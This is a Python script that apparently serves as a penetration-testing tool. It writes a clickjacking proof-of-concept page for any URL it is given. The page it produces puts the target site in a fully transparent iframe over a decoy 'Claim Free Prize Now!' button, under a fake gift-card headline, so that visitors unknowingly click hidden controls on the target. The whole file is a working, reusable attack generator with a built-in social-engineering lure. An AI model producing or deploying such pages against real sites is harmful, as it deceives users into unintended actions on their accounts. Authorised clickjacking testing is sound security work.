"""
Aadi — Clickjacking & UI Redressing Generator
Author: Aaditya Kumar Pandey | Instagram: @aadi_97621
"""

import os
from rich.console import Console
from rich.panel import Panel

console = Console()


def generate_clickjack_poc(target_url: str, output_file: str = "clickjack_poc.html"):
    """Generate a high-impact Clickjacking HTML Proof-of-Concept template."""
    console.print(Panel(f"[cyan]Generating Clickjacking PoC for target: {target_url}[/]", border_style="magenta"))

    html_template = f"""<!DOCTYPE html>
<html>
<head>
    <title>Security Assessment - Clickjack PoC</title>
    <style>
        html, body {{
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
        }}
        #container {{
            position: relative;
            width: 800px;
            height: 600px;
        }}
        /* Transparent iframe containing the target sensitive page */
        iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.00; /* Fully transparent */
            z-index: 2;
        }}
        /* Fake enticing layer above the iframe */
        #fake-button {{
            position: absolute;
            top: 250px;
            left: 350px;
            z-index: 1;
            background: #ff4757;
            color: white;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }}
    </style>
</head>
<body>
    <center>
        <h2>🎉 Congratulations! You won a free gift card! Click below to claim.</h2>
        <div id="container">
            <!-- The malicious decoy button placed directly over sensitive UI action -->
            <button id="fake-button">Claim Free Prize Now!</button>
            <iframe src="{target_url}"></iframe>
        </div>
    </center>
</body>
</html>
"""

    try:
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(html_template)
        console.print(f"[bold green]✓ Clickjacking PoC successfully generated and saved to:[/] {output_file}")
    except Exception as e:
        console.print(f"[bold red]✗ Failed to generate clickjack file: {e}[/]")